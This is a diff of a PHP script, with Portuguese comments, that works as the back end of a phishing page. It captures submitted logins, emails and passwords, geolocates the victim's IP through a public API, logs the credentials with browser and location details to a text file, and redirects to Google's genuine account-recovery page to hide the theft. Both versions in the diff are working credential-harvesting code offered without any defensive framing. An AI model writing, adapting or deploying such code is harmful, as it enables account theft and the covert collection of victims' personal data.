@@ -1,37 +1,30 @@
 <?php
-// Dados enviados pelo formulário
-$login = $_POST['login'] ?? 'N/A';
-$email = $_POST['email'] ?? 'N/A';
-$senha = $_POST['senha'] ?? 'N/A';
 
-// Captura de metadados
 $ip = $_SERVER['REMOTE_ADDR'];
-$dataHora = date("Y-m-d H:i:s");
-$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
+$useragent = $_SERVER['HTTP_USER_AGENT'];
 $referrer = $_SERVER['HTTP_REFERER'] ?? 'N/A';
+$dataHora = date("Y-m-d H:i:s");
 
-// Consulta de geolocalização via IP (API pública)
-$geo = json_decode(file_get_contents("http://ip-api.com/json/$ip?lang=pt"), true);
+// Coleta dos campos do formulário
+$login = $_POST['login'];
+$email = $_POST['email'];
+$senha = $_POST['senha'];
 
+// Requisição à API de geolocalização via IP
+$geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip?lang=pt"), true);
 $pais = $geo['country'] ?? 'Desconhecido';
 $cidade = $geo['city'] ?? 'Desconhecida';
 $regiao = $geo['regionName'] ?? 'Desconhecida';
 $isp = $geo['isp'] ?? 'Desconhecido';
-$org = $geo['org'] ?? 'Desconhecida';
 
-// Montagem do registro
-$log = "----------------------------------------\n";
-$log .= "Data/Hora: $dataHora\n";
-$log .= "Login: $login | Email: $email | Senha: $senha\n";
-$log .= "IP: $ip | Cidade: $cidade | Região: $regiao | País: $pais\n";
-$log .= "ISP: $isp | Organização: $org\n";
-$log .= "Navegador: $userAgent\n";
-$log .= "Referência: $referrer\n";
+// Registro concatenado no estilo original
+$log = "Login: $login | Email: $email | Senha: $senha | IP: $ip | Cidade: $cidade | Região: $regiao | País: $pais | ISP: $isp | Agente: $useragent | Referrer: $referrer | Data/Hora: $dataHora\n";
 
-// Salvamento em arquivo
+// Salvando em arquivo
 file_put_contents("logins.txt", $log, FILE_APPEND);
 
-// Redirecionamento após envio
+// Redirecionamento
 header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
 exit();
+
 ?>
